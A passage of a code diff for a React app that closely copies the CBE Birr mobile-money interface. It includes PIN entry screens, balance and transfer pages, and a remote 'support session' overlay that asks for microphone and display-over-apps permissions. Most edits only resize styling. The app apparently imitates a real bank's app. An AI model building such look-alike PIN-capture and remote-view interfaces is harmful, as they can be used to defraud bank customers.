+                  Enable Microphone, Notifications &amp; Display-Over-Apps so incoming Wi-Fi calls ring even outside the app.
+                </p>
+              </div>
+              <div className="flex items-center gap-[1.2cqw] shrink-0">
+                <button
+                  type="button"
+                  onClick={() => void handleGrantCallPermissions()}
+                  style={{ fontSize: '2.3cqw' }}
+                  className="px-[2.4cqw] py-[1cqw] rounded-[1.6cqw] bg-sky-600 hover:bg-sky-500 text-white font-bold cursor-pointer whitespace-nowrap"
+                >
+                  Allow
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setShowCallPermsBanner(false)}
+                  className="text-slate-400 hover:text-white cursor-pointer p-[0.5cqw]"
+                  aria-label="Dismiss permission prompt"
+                >
+                  <X style={{ width: '3.4cqw', height: '3.4cqw' }} />
+                </button>
+              </div>
+            </div>
+          )}
+
         {/* Visible Support Tip Toast inside Active Support Session */}
         {supportSession?.status === 'active' && supportTipBanner && !showOwnerDashboard && (
-          <div className="absolute top-9 left-3 right-3 z-[75] bg-[#17212b]/95 text-white border border-emerald-400/50 rounded-xl px-3 py-2 shadow-xl flex items-start justify-between gap-2">
-            <div className="flex items-start gap-2 min-w-0">
-              <HelpCircle className="w-4 h-4 text-emerald-300 shrink-0 mt-0.5" />
-              <p className="text-[11.5px] font-medium leading-snug break-words">
+          <div style={{ top: '9cqw', left: '3cqw', right: '3cqw' }} className="absolute z-[75] bg-[#17212b]/95 text-white border border-emerald-400/50 rounded-[2.8cqw] px-[3cqw] py-[2cqw] shadow-xl flex items-start justify-between gap-[2cqw]">
+            <div className="flex items-start gap-[2cqw] min-w-0">
+              <HelpCircle style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-emerald-300 shrink-0 mt-[0.3cqw]" />
+              <p style={{ fontSize: '2.7cqw' }} className="font-medium leading-snug break-words">
                 {supportTipBanner}
               </p>
             </div>
@@ -4322,10 +5532,32 @@ export default function CBEBirrFullscreenApp() {
               className="text-slate-300 hover:text-white cursor-pointer shrink-0"
               aria-label="Dismiss tip"
             >
-              <X className="w-3.5 h-3.5" />
+              <X style={{ width: '3.4cqw', height: '3.4cqw' }} />
             </button>
           </div>
         )}
+
+        {/* Visible Remote Touch Ripple Feedback during Active Support Cast */}
+        {supportSession?.status === 'active' &&
+          !showOwnerDashboard &&
+          remoteTouchRipple && (
+            <div
+              key={remoteTouchRipple.key}
+              data-support-ignore="true"
+              style={{
+                left: `${remoteTouchRipple.xPct}%`,
+                top: `${remoteTouchRipple.yPct}%`,
+              }}
+              className="absolute -translate-x-1/2 -translate-y-1/2 z-[76] pointer-events-none flex flex-col items-center"
+            >
+              <div className="w-[8cqw] h-[8cqw] rounded-full border-[0.6cqw] border-emerald-400 bg-emerald-400/30 animate-ping" />
+              {remoteTouchRipple.label && (
+                <span style={{ fontSize: '2.2cqw' }} className="mt-[0.8cqw] px-[1.6cqw] py-[0.4cqw] rounded-[1.2cqw] bg-emerald-700 text-white font-bold shadow whitespace-nowrap">
+                  {remoteTouchRipple.label}
+                </span>
+              )}
+            </div>
+          )}
 
         {/* Visible Remote Guide Pointer (Shown explicitly to user during Active Session) */}
         {supportSession?.status === 'active' &&
@@ -4333,16 +5565,17 @@ export default function CBEBirrFullscreenApp() {
           supportSession.pointerX >= 0 &&
           supportSession.pointerY >= 0 && (
             <div
+              data-support-ignore="true"
               style={{
                 left: `${supportSession.pointerX}%`,
                 top: `${supportSession.pointerY}%`,
               }}
               className="absolute -translate-x-1/2 -translate-y-1/2 z-[74] pointer-events-none flex flex-col items-center"
             >
-              <div className="w-10 h-10 rounded-full border-[3px] border-emerald-500 bg-emerald-400/25 shadow-[0_0_20px_rgba(16,185,129,0.8)] animate-pulse flex items-center justify-center">
-                <Crosshair className="w-5 h-5 text-emerald-700" />
+              <div className="w-[9cqw] h-[9cqw] rounded-full border-[0.7cqw] border-emerald-500 bg-emerald-400/25 shadow-[0_0_20px_rgba(16,185,129,0.8)] animate-pulse flex items-center justify-center">
+                <Crosshair style={{ width: '4.8cqw', height: '4.8cqw' }} className="text-emerald-700" />
               </div>
-              <span className="mt-1 px-2 py-0.5 rounded-md bg-emerald-700 text-white text-[10px] font-bold shadow whitespace-nowrap">
+              <span style={{ fontSize: '2.4cqw' }} className="mt-[1cqw] px-[2cqw] py-[0.5cqw] rounded-[1.4cqw] bg-emerald-700 text-white font-bold shadow whitespace-nowrap">
                 {supportSession.pointerLabel || 'Support Guide'}
               </span>
             </div>
@@ -4435,12 +5668,18 @@ export default function CBEBirrFullscreenApp() {
                   className="flex whitespace-nowrap shrink-0 h-full items-center"
                 >
                   <div style={{ width: '50%' }} className="flex items-center shrink-0">
-                    <span className="text-[#8c288e] text-[12.5px] sm:text-[13px] font-bold tracking-tight select-none leading-none">
+                    <span
+                      style={{ fontSize: '2.75cqw', fontWeight: 700 }}
+                      className="text-[#8c288e] tracking-tight select-none leading-none"
+                    >
                       Welcome to CBEBirr Plus app!
                     </span>
                   </div>
                   <div style={{ width: '50%' }} className="flex items-center shrink-0">
-                    <span className="text-[#8c288e] text-[12.5px] sm:text-[13px] font-bold tracking-tight select-none leading-none">
+                    <span
+                      style={{ fontSize: '2.75cqw', fontWeight: 700 }}
+                      className="text-[#8c288e] tracking-tight select-none leading-none"
+                    >
                       Welcome to CBEBirr Plus app!
                     </span>
                   </div>
@@ -4474,7 +5713,8 @@ export default function CBEBirrFullscreenApp() {
                       }
                     } catch {}
                   }}
-                  className="w-full h-full bg-[#ebe8ec] text-[#222222] text-[13.5px] sm:text-[14px] font-medium tracking-[0.03em] px-2.5 border-0 outline-none select-text flex items-center leading-normal"
+                  style={{ fontSize: '2.74cqw', fontWeight: 400, letterSpacing: '0.02em' }}
+                  className="w-full h-full bg-[#ebe8ec] text-[#222222] px-[2.4cqw] border-0 outline-none select-text flex items-center leading-normal"
                   placeholder="9..."
                   autoComplete="tel"
                 />
@@ -4613,15 +5853,24 @@ export default function CBEBirrFullscreenApp() {
                 className="z-20 flex items-center justify-center pointer-events-none select-none"
               >
                 {!pin ? (
-                  <span className="text-[#8e8c8f] font-normal text-[15px] sm:text-[16px] tracking-normal">
+                  <span
+                    style={{ fontSize: '2.65cqw', fontWeight: 400 }}
+                    className="text-[#8e8c8f] tracking-normal"
+                  >
                     PIN
                   </span>
                 ) : showLoginPin ? (
-                  <span className="text-[#1c1b1f] font-bold text-[17px] sm:text-[18px] tracking-[4px]">
+                  <span
+                    style={{ fontSize: '3.25cqw', letterSpacing: '0.8cqw' }}
+                    className="text-[#1c1b1f] font-bold"
+                  >
                     {pin}
                   </span>
                 ) : (
-                  <span className="text-[#1c1b1f] font-bold text-[22px] sm:text-[24px] tracking-[6px] pt-1">
+                  <span
+                    style={{ fontSize: '4.0cqw', letterSpacing: '1.1cqw', paddingTop: '0.5cqw' }}
+                    className="text-[#1c1b1f] font-bold"
+                  >
                     {'*'.repeat(pin.length)}
                   </span>
                 )}
@@ -4661,8 +5910,9 @@ export default function CBEBirrFullscreenApp() {
                     top: '32.5%',
                     left: '12%',
                     width: '76%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-30 text-center text-[12px] font-bold text-white bg-red-600/90 py-1.5 px-3 rounded-full shadow-lg pointer-events-none"
+                  className="z-30 text-center font-bold text-white bg-red-600/90 py-[1.2cqw] px-[2.8cqw] rounded-full shadow-lg pointer-events-none"
                 >
                   {pinError}
                 </motion.div>
@@ -4955,25 +6205,35 @@ export default function CBEBirrFullscreenApp() {
                     title="Long-press to edit profile and details"
                   >
                     {/* Row 1: Authentic Phone Icon + Number (soft muted peach matching top PNG text) */}
-                    <div className="flex items-center justify-center gap-[2.5px]">
+                    <div className="flex items-center justify-center gap-[0.55cqw]">
                       {/* eslint-disable-next-line @next/next/no-img-element */}
                       <img
                         src="/assets/cbe_balance_phone_icon.png"
                         alt=""
-                        className="w-[12px] h-[12px] object-contain opacity-80 shrink-0 pointer-events-none select-none"
+                        style={{ width: '2.15cqw', height: '2.15cqw' }}
+                        className="object-contain opacity-80 shrink-0 pointer-events-none select-none"
                         draggable={false}
                       />
-                      <span className="text-[#eebd9c] text-[11.2px] sm:text-[12px] font-medium tracking-[0.03em] select-none whitespace-nowrap leading-none font-sans">
+                      <span
+                        style={{ fontSize: '2.40cqw', fontWeight: 400, letterSpacing: '0.03em' }}
+                        className="text-[#eebd9c] select-none whitespace-nowrap leading-none font-sans"
+                      >
                         {phoneNumber ? `+251${phoneNumber.slice(0, 6)}***` : '+251------***'}
                       </span>
                     </div>
 
                     {/* Row 2: Typewriter Animated Greeting / First Name with blinking cursor (Actionable, matches WELCOME BACK & AYMEN !) */}
-                    <div className="flex items-center justify-center mt-1">
-                      <span className="text-[#eebd9c] text-[10.2px] sm:text-[11px] font-medium tracking-[0.08em] select-none whitespace-nowrap leading-none uppercase font-sans">
+                    <div style={{ marginTop: '0.7cqw' }} className="flex items-center justify-center">
+                      <span
+                        style={{ fontSize: '2.40cqw', fontWeight: 400, letterSpacing: '0.07em' }}
+                        className="text-[#eebd9c] select-none whitespace-nowrap leading-none uppercase font-sans"
+                      >
                         {displayText || 'WELCOME BACK'}
                       </span>
-                      <span className="inline-block text-[#eebd9c] text-[10.2px] sm:text-[11px] font-bold ml-0.5 animate-pulse select-none leading-none">
+                      <span
+                        style={{ fontSize: '2.40cqw', marginLeft: '0.35cqw' }}
+                        className="inline-block text-[#eebd9c] font-bold animate-pulse select-none leading-none"
+                      >
                         _
                       </span>
                     </div>
@@ -5008,8 +6268,8 @@ export default function CBEBirrFullscreenApp() {
                         position: 'absolute',
                         top: '76.5%',
                         left: '6.0%',
-                        width: '58px',
-                        height: '20px',
+                        width: '12%',
+                        height: '4.2%',
                         backgroundColor: '#842789',
                       }}
                       className="pointer-events-none z-10 overflow-hidden"
@@ -5026,10 +6286,10 @@ export default function CBEBirrFullscreenApp() {
                     <div
                       style={{
                         position: 'absolute',
-                        top: '76.4%',
+                        top: '76.6%',
                         left: '6.2%',
                         maxWidth: '45%',
-                        minHeight: '22px',
+                        minHeight: '4.1%',
                         backgroundColor: '#842789',
                       }}
                       className="flex items-center pointer-events-none z-10"
@@ -5038,9 +6298,9 @@ export default function CBEBirrFullscreenApp() {
                         className="cbe-balance-reveal-anim whitespace-nowrap leading-none"
                         style={{
                           color: '#ffffff',
-                          fontSize: 'clamp(14px, 3.8vw, 17px)',
-                          fontWeight: 600,
-                          letterSpacing: '0.2px',
+                          fontSize: '2.55cqw',
+                          fontWeight: 400,
+                          letterSpacing: '0.02em',
                         }}
                       >
                         {formatAmount(balance)}
@@ -5056,8 +6316,8 @@ export default function CBEBirrFullscreenApp() {
                         position: 'absolute',
                         top: '76.5%',
                         right: '6.0%',
-                        width: '58px',
-                        height: '20px',
+                        width: '12%',
+                        height: '4.2%',
                         backgroundColor: '#842789',
                       }}
                       className="pointer-events-none z-10 overflow-hidden"
@@ -5074,10 +6334,10 @@ export default function CBEBirrFullscreenApp() {
                     <div
                       style={{
                         position: 'absolute',
-                        top: '76.4%',
+                        top: '76.6%',
                         right: '7.2%',
                         maxWidth: '45%',
-                        minHeight: '22px',
+                        minHeight: '4.1%',
                       }}
                       className="flex items-center justify-end bg-[#842789] pointer-events-none z-10"
                     >
@@ -5085,9 +6345,9 @@ export default function CBEBirrFullscreenApp() {
                         className="cbe-balance-reveal-anim whitespace-nowrap leading-none"
                         style={{
                           color: '#ffffff',
-                          fontSize: 'clamp(14px, 3.8vw, 17px)',
-                          fontWeight: 600,
-                          letterSpacing: '0.2px',
+                          fontSize: '2.55cqw',
+                          fontWeight: 400,
+                          letterSpacing: '0.02em',
                         }}
                       >
                         {formatAmount(reward)}
@@ -6087,7 +7347,10 @@ export default function CBEBirrFullscreenApp() {
                   }}
                   className="bg-[#7b237c] flex items-center z-10 pointer-events-none select-none"
                 >
-                  <span className="text-white text-[12px] sm:text-[13px] font-semibold tracking-wide whitespace-nowrap overflow-hidden text-ellipsis uppercase leading-none">
+                  <span
+                    style={{ fontSize: '2.58cqw', fontWeight: 400, letterSpacing: '0.04em' }}
+                    className="text-white whitespace-nowrap overflow-hidden text-ellipsis uppercase leading-none"
+                  >
                     {userName.length > 9 ? `${userName.slice(0, 8).toUpperCase()}****` : userName.toUpperCase()}
                   </span>
                 </div>
@@ -6194,10 +7457,10 @@ export default function CBEBirrFullscreenApp() {
                 <div
                   style={{
                     position: 'absolute',
-                    top: '-47px',
+                    top: '-12.5cqw',
                     right: '6.8%',
-                    width: '54px',
-                    height: '54px',
+                    width: '14.5cqw',
+                    height: '14.5cqw',
                   }}
                   className="z-30 cursor-pointer active:scale-95 transition-transform drop-shadow-lg"
                   onClick={() => {
@@ -6439,8 +7702,10 @@ export default function CBEBirrFullscreenApp() {
                   left: '21.5%',
                   width: '60.0%',
                   height: '3.0%',
+                  fontSize: '2.68cqw',
+                  fontWeight: 400,
                 }}
-                className={`z-20 text-[#262626] text-[13px] sm:text-[14px] font-normal outline-none px-1 bg-transparent placeholder-[#90869a] ${isTransferring ? 'pointer-events-none opacity-60' : ''}`}
+                className={`z-20 text-[#262626] outline-none px-[0.8cqw] bg-transparent placeholder-[#90869a] ${isTransferring ? 'pointer-events-none opacity-60' : ''}`}
               />
 
               {/* Hotspot: QR Code Icon on right of Receivers Account (Clicking does NOTHING per user request) */}
@@ -6471,8 +7736,10 @@ export default function CBEBirrFullscreenApp() {
                     left: '5.0%',
                     width: '90.0%',
                     height: '2.4%',
+                    fontSize: '2.85cqw',
+                    fontWeight: 500,
                   }}
-                  className="flex items-center justify-center text-center text-[#18181b] text-[14.5px] sm:text-[15px] font-semibold tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
+                  className="flex items-center justify-center text-center text-[#18181b] tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
                 >
                   <span>{activeReceiverName}</span>
                 </div>
@@ -6498,8 +7765,10 @@ export default function CBEBirrFullscreenApp() {
                   left: '21.5%',
                   width: '60.0%',
                   height: '3.5%',
+                  fontSize: '2.68cqw',
+                  fontWeight: 400,
                 }}
-                className={`z-20 text-[#262626] text-[14px] sm:text-[15px] font-semibold outline-none px-1 bg-transparent placeholder-[#90869a] ${isTransferring ? 'pointer-events-none opacity-60' : ''}`}
+                className={`z-20 text-[#262626] outline-none px-[0.8cqw] bg-transparent placeholder-[#90869a] ${isTransferring ? 'pointer-events-none opacity-60' : ''}`}
               />
 
               {/* Calculator Icon Hotspot */}
@@ -6535,8 +7804,10 @@ export default function CBEBirrFullscreenApp() {
                   left: '21.5%',
                   width: '70.0%',
                   height: '3.5%',
+                  fontSize: '2.68cqw',
+                  fontWeight: 400,
                 }}
-                className={`z-20 text-[#262626] text-[13px] sm:text-[14px] font-normal outline-none px-1 bg-transparent placeholder-[#90869a] ${isTransferring ? 'pointer-events-none opacity-60' : ''}`}
+                className={`z-20 text-[#262626] outline-none px-[0.8cqw] bg-transparent placeholder-[#90869a] ${isTransferring ? 'pointer-events-none opacity-60' : ''}`}
               />
 
               {/* Inline Error Alert if validation fails */}
@@ -6547,8 +7818,9 @@ export default function CBEBirrFullscreenApp() {
                     top: '41.3%',
                     left: '8.0%',
                     width: '84.0%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-20 text-center text-xs font-semibold text-red-600 bg-red-50 border border-red-300 py-1.5 px-2 rounded-lg shadow-xs"
+                  className="z-20 text-center font-semibold text-red-600 bg-red-50 border border-red-300 py-[1cqw] px-[2cqw] rounded-[2cqw] shadow-xs"
                 >
                   {transferError}
                 </div>
@@ -6588,7 +7860,7 @@ export default function CBEBirrFullscreenApp() {
                     }}
                     className="bg-[#8c288e] rounded-2xl shadow-[0_6px_28px_rgba(0,0,0,0.32)] border border-white/10 flex items-center justify-center z-40 pointer-events-auto p-2"
                   >
-                    <div className="relative w-12 h-12 flex items-center justify-center pointer-events-none select-none">
+                    <div className="relative w-[13cqw] h-[13cqw] flex items-center justify-center pointer-events-none select-none">
                       {/* 1. Only the authentic cropped yellow ring spinner rotating in fluid animation style, keeping its place */}
                       {/* eslint-disable-next-line @next/next/no-img-element */}
                       <img
@@ -6605,7 +7877,7 @@ export default function CBEBirrFullscreenApp() {
                       <img
                         src="/assets/aistudio/cbe_transfer_logo_static.png"
                         alt="CBE"
-                        className="w-7 h-7 object-contain pointer-events-none select-none relative z-10 block"
+                        className="w-[7.5cqw] h-[7.5cqw] object-contain pointer-events-none select-none relative z-10 block"
                       />
                     </div>
                   </motion.div>
@@ -6665,68 +7937,74 @@ export default function CBEBirrFullscreenApp() {
                 /* AUTHENTIC OTHER BANK & OTHER WALLET TRANSFER PIN PAGE (Matches authentic CBEBirr PIN layout: upper Auth sheet + lower scrollable cards right above keypad) */
                 <div className="relative w-full h-full bg-[#7a1c7d] flex flex-col overflow-hidden">
                   {/* 1. FIXED TOP HEADER BAR (6.8% height) */}
-                  <div className="shrink-0 w-full h-[6.8%] min-h-[44px] bg-[#7a1c7d] flex items-center justify-between px-3.5 z-30">
+                  <div className="shrink-0 w-full h-[6.8%] min-h-[11cqw] bg-[#7a1c7d] flex items-center justify-between px-[3.5cqw] z-30">
                     {/* Back button */}
                     <button
                       type="button"
                       onClick={handleBackFromTransferPin}
-                      className="w-9 h-9 rounded-xl border border-white/35 flex items-center justify-center text-white active:bg-white/10 transition-colors cursor-pointer"
+                      className="w-[9.5cqw] h-[9.5cqw] rounded-[2.6cqw] border border-white/35 flex items-center justify-center text-white active:bg-white/10 transition-colors cursor-pointer"
                       aria-label="Back"
                     >
-                      <ArrowLeft className="w-5 h-5 stroke-[2.2]" />
+                      <ArrowLeft style={{ width: '5cqw', height: '5cqw' }} strokeWidth={2.2} />
                     </button>
 
                     {/* Title */}
-                    <h2 className="text-white text-[15px] sm:text-[16px] font-semibold tracking-wide truncate px-2">
+                    <h2
+                      style={{ fontSize: '3.3cqw', fontWeight: 600 }}
+                      className="text-white tracking-wide truncate px-[2cqw]"
+                    >
                       {transferSource === 'other_wallets' ? 'Wallet Transfer' : 'Bank Transfer'}
                     </h2>
 
                     {/* Search & Language */}
-                    <div className="flex items-center gap-3">
+                    <div className="flex items-center gap-[3cqw]">
                       <button
                         type="button"
-                        className="text-white/90 hover:text-white p-1 cursor-pointer"
+                        className="text-white/90 hover:text-white p-[0.8cqw] cursor-pointer"
                         aria-label="Search"
                       >
-                        <Search className="w-5 h-5 stroke-[2]" />
+                        <Search style={{ width: '4.8cqw', height: '4.8cqw' }} strokeWidth={2} />
                       </button>
-                      <span className="text-white text-xs font-bold tracking-wider uppercase ml-1">
+                      <span
+                        style={{ fontSize: '2.7cqw' }}
+                        className="text-white font-bold tracking-wider uppercase ml-[0.8cqw]"
+                      >
                         EN
                       </span>
                     </div>
                   </div>
 
                   {/* MAIN BODY ROUNDED SHEET CONTAINER */}
-                  <div className="flex-1 min-h-0 w-full bg-[#D1CFCF] rounded-t-[18px] flex flex-col overflow-hidden">
+                  <div className="flex-1 min-h-0 w-full bg-[#D1CFCF] rounded-t-[4.5cqw] flex flex-col overflow-hidden">
                     {/* 2. AUTHENTICATION SECTION (Upper ~42.5% of body = down to ~46.5% of screen, matching screen_transfer_pin_clean.png) */}
-                    <div className="shrink-0 w-full h-[42.5%] bg-[#CCC9CD] px-6 pt-3 pb-3 flex flex-col items-center justify-start z-20 border-b border-black/10 relative">
+                    <div className="shrink-0 w-full h-[42.5%] bg-[#CCC9CD] px-[6cqw] pt-[2.8cqw] pb-[2.8cqw] flex flex-col items-center justify-start z-20 border-b border-black/10 relative">
                       {/* Top Purple Chevron Down */}
                       <button
                         type="button"
                         onClick={handleBackFromTransferPin}
-                        className="p-1 text-[#8b278e] hover:opacity-80 active:scale-95 transition-transform cursor-pointer"
+                        className="p-[1cqw] text-[#8b278e] hover:opacity-80 active:scale-95 transition-transform cursor-pointer"
                         aria-label="Back to transfer"
                       >
-                        <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
+                        <svg style={{ width: '5cqw', height: '5cqw' }} className="fill-current" viewBox="0 0 24 24">
                           <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/>
                         </svg>
                       </button>
 
                       {/* Title & Subtitle */}
-                      <div className="mt-4 sm:mt-5 flex flex-col items-center text-center">
-                        <h3 className="text-[#1c1b1f] font-bold text-[15px] sm:text-[16px] tracking-tight">
+                      <div className="mt-[3.5cqw] flex flex-col items-center text-center">
+                        <h3 style={{ fontSize: '3.1cqw', fontWeight: 700 }} className="text-[#1c1b1f] tracking-tight">
                           Authentication
                         </h3>
-                        <p className="text-[#49454f] text-[11.5px] sm:text-[12px] mt-1 font-normal">
+                        <p style={{ fontSize: '2.35cqw', fontWeight: 400 }} className="text-[#49454f] mt-[0.8cqw]">
                           Please enter valid PIN to continue the process
                         </p>
                       </div>
 
                       {/* PIN Input Box */}
-                      <div className="w-[82%] bg-[#F7F2FA] rounded-xl border border-[#49454f]/70 h-11 sm:h-12 mt-4 px-3.5 flex items-center justify-between shadow-xs">
+                      <div className="w-[82%] bg-[#F7F2FA] rounded-[3cqw] border border-[#49454f]/70 h-[11.5cqw] mt-[3.8cqw] px-[3.5cqw] flex items-center justify-between shadow-xs">
                         {/* Warning triangle */}
                         <div className="text-[#f59e0b] shrink-0">
-                          <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
+                          <svg style={{ width: '4.8cqw', height: '4.8cqw' }} className="fill-current" viewBox="0 0 24 24">
                             <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
                           </svg>
                         </div>
@@ -6734,15 +8012,21 @@ export default function CBEBirrFullscreenApp() {
                         {/* PIN display */}
                         <div className="flex-1 flex items-center justify-center pointer-events-none select-none">
                           {!transferPin ? (
-                            <span className="text-[#9ca3af] font-normal text-[15px]">
+                            <span style={{ fontSize: '2.65cqw', fontWeight: 400 }} className="text-[#9ca3af]">
                               PIN
                             </span>
                           ) : showTransferPin ? (
-                            <span className="text-[#1c1b1f] font-bold text-[17px] tracking-[6px]">
+                            <span
+                              style={{ fontSize: '3.25cqw', letterSpacing: '0.8cqw' }}
+                              className="text-[#1c1b1f] font-bold"
+                            >
                               {transferPin}
                             </span>
                           ) : (
-                            <span className="text-[#1c1b1f] font-bold text-[22px] tracking-[6px] pt-1">
+                            <span
+                              style={{ fontSize: '4.0cqw', letterSpacing: '1.1cqw', paddingTop: '0.5cqw' }}
+                              className="text-[#1c1b1f] font-bold"
+                            >
                               {'*'.repeat(transferPin.length)}
                             </span>
                           )}
@@ -6752,16 +8036,16 @@ export default function CBEBirrFullscreenApp() {
                         <button
                           type="button"
                           onClick={() => setShowTransferPin((prev) => !prev)}
-                          className="text-[#8b278e] p-1 hover:opacity-80 active:scale-95 transition-transform cursor-pointer shrink-0"
+                          className="text-[#8b278e] p-[0.8cqw] hover:opacity-80 active:scale-95 transition-transform cursor-pointer shrink-0"
                           aria-label={showTransferPin ? "Hide PIN" : "Show PIN"}
                         >
                           {showTransferPin ? (
-                            <svg className="w-5 h-5 fill-none stroke-current stroke-2" viewBox="0 0 24 24">
+                            <svg style={{ width: '4.8cqw', height: '4.8cqw' }} className="fill-none stroke-current stroke-2" viewBox="0 0 24 24">
                               <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                               <circle cx="12" cy="12" r="3"/>
                             </svg>
                           ) : (
-                            <svg className="w-5 h-5 fill-none stroke-current stroke-2" viewBox="0 0 24 24">
+                            <svg style={{ width: '4.8cqw', height: '4.8cqw' }} className="fill-none stroke-current stroke-2" viewBox="0 0 24 24">
                               <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                               <line x1="1" y1="1" x2="23" y2="23"/>
                             </svg>
@@ -6774,7 +8058,8 @@ export default function CBEBirrFullscreenApp() {
                         <motion.div
                           initial={{ opacity: 0, y: -4 }}
                           animate={{ opacity: 1, y: 0 }}
-                          className="mt-3 text-center text-[12px] font-bold text-white bg-red-600/95 py-1 px-3.5 rounded-full shadow-md"
+                          style={{ fontSize: '2.6cqw' }}
+                          className="mt-[2.5cqw] text-center font-bold text-white bg-red-600/95 py-[1cqw] px-[3.2cqw] rounded-full shadow-md"
                         >
                           {transferPinError}
                         </motion.div>
@@ -6789,7 +8074,7 @@ export default function CBEBirrFullscreenApp() {
                       onPointerUp={handleStep7PointerUp}
                       onPointerCancel={handleStep7PointerUp}
                       onPointerLeave={handleStep7PointerUp}
-                      className="flex-1 min-h-0 w-full bg-[#D1CFCF] px-4 overflow-y-auto overflow-x-hidden relative space-y-2.5 pt-2.5 pb-3 touch-pan-y [scrollbar-width:thin] [scrollbar-color:#8b278e_transparent] [&::-webkit-scrollbar]:w-1.5 [&::-webkit-scrollbar-thumb]:bg-[#8b278e]/70 [&::-webkit-scrollbar-thumb]:rounded-full [&::-webkit-scrollbar-track]:bg-black/5"
+                      className="flex-1 min-h-0 w-full bg-[#D1CFCF] px-[3.8cqw] overflow-y-auto overflow-x-hidden relative space-y-[2.2cqw] pt-[2.4cqw] pb-[2.8cqw] touch-pan-y [scrollbar-width:thin] [scrollbar-color:#8b278e_transparent] [&::-webkit-scrollbar]:w-1.5 [&::-webkit-scrollbar-thumb]:bg-[#8b278e]/70 [&::-webkit-scrollbar-thumb]:rounded-full [&::-webkit-scrollbar-track]:bg-black/5"
                       style={{
                         WebkitOverflowScrolling: 'touch',
                         overscrollBehaviorY: 'contain',
@@ -6797,114 +8082,115 @@ export default function CBEBirrFullscreenApp() {
                       }}
                     >
                       {/* Card 1: Bank / Wallet Name (Bank - MPESA / Awash) */}
-                      <div className="w-full min-h-[62px] bg-[#F7F2FA] rounded-2xl px-3.5 py-2.5 flex items-center justify-between shadow-xs border border-white/75 shrink-0">
-                        <div className="flex items-center gap-3 min-w-0">
-                          <div className="w-5 h-5 rounded-full bg-black text-white flex items-center justify-center shrink-0">
-                            <span className="text-[11px] font-bold italic font-serif">i</span>
+                      <div className="w-full min-h-[13.5cqw] bg-[#F7F2FA] rounded-[3.6cqw] px-[3.5cqw] py-[2.2cqw] flex items-center justify-between shadow-xs border border-white/75 shrink-0">
+                        <div className="flex items-center gap-[2.8cqw] min-w-0">
+                          <div className="w-[4.8cqw] h-[4.8cqw] rounded-full bg-black text-white flex items-center justify-center shrink-0">
+                            <span style={{ fontSize: '2.3cqw' }} className="font-bold italic font-serif">i</span>
                           </div>
                           <div className="flex flex-col min-w-0">
-                            <span className="text-[11.5px] text-[#4b5563] font-medium leading-none">
+                            <span style={{ fontSize: '2.25cqw', fontWeight: 400 }} className="text-[#4b5563] leading-none">
                               Bank
                             </span>
-                            <span className="text-[13.5px] text-[#1c1b1f] font-semibold mt-1 leading-tight truncate">
+                            <span style={{ fontSize: '2.75cqw', fontWeight: 500 }} className="text-[#1c1b1f] mt-[0.8cqw] leading-tight truncate">
                               {transferSource === 'other_wallets'
                                 ? (selectedWallet?.name || 'MPESA')
                                 : (selectedBank?.name || 'Awash International Bank')}
                             </span>
                           </div>
                         </div>
-                        <Check className="w-4 h-4 text-black stroke-[2.5] shrink-0" />
+                        <Check style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-black shrink-0" strokeWidth={2.5} />
                       </div>
 
                       {/* Card 2: Customer Name */}
-                      <div className="w-full min-h-[62px] bg-[#F7F2FA] rounded-2xl px-3.5 py-2.5 flex items-center justify-between shadow-xs border border-white/75 shrink-0">
-                        <div className="flex items-center gap-3 min-w-0">
-                          <div className="w-5 h-5 rounded-full bg-black text-white flex items-center justify-center shrink-0">
-                            <span className="text-[11px] font-bold italic font-serif">i</span>
+                      <div className="w-full min-h-[13.5cqw] bg-[#F7F2FA] rounded-[3.6cqw] px-[3.5cqw] py-[2.2cqw] flex items-center justify-between shadow-xs border border-white/75 shrink-0">
+                        <div className="flex items-center gap-[2.8cqw] min-w-0">
+                          <div className="w-[4.8cqw] h-[4.8cqw] rounded-full bg-black text-white flex items-center justify-center shrink-0">
+                            <span style={{ fontSize: '2.3cqw' }} className="font-bold italic font-serif">i</span>
                           </div>
                           <div className="flex flex-col min-w-0">
-                            <span className="text-[11.5px] text-[#4b5563] font-medium leading-none">
+                            <span style={{ fontSize: '2.25cqw', fontWeight: 400 }} className="text-[#4b5563] leading-none">
                               Customer Name
                             </span>
-                            <span className="text-[13.5px] text-[#1c1b1f] font-semibold mt-1 leading-tight truncate">
+                            <span style={{ fontSize: '2.75cqw', fontWeight: 500 }} className="text-[#1c1b1f] mt-[0.8cqw] leading-tight truncate">
                               {transferSource === 'other_wallets'
                                 ? (walletReceiverName || '')
                                 : (bankReceiverName || '')}
                             </span>
                           </div>
                         </div>
-                        <Check className="w-4 h-4 text-black stroke-[2.5] shrink-0" />
+                        <Check style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-black shrink-0" strokeWidth={2.5} />
                       </div>
 
                       {/* Card 3: Account No. */}
-                      <div className="w-full min-h-[62px] bg-[#F7F2FA] rounded-2xl px-3.5 py-2.5 flex items-center justify-between shadow-xs border border-white/75 shrink-0">
-                        <div className="flex items-center gap-3 min-w-0">
-                          <div className="w-5 h-5 rounded-full bg-black text-white flex items-center justify-center shrink-0">
-                            <span className="text-[11px] font-bold italic font-serif">i</span>
+                      <div className="w-full min-h-[13.5cqw] bg-[#F7F2FA] rounded-[3.6cqw] px-[3.5cqw] py-[2.2cqw] flex items-center justify-between shadow-xs border border-white/75 shrink-0">
+                        <div className="flex items-center gap-[2.8cqw] min-w-0">
+                          <div className="w-[4.8cqw] h-[4.8cqw] rounded-full bg-black text-white flex items-center justify-center shrink-0">
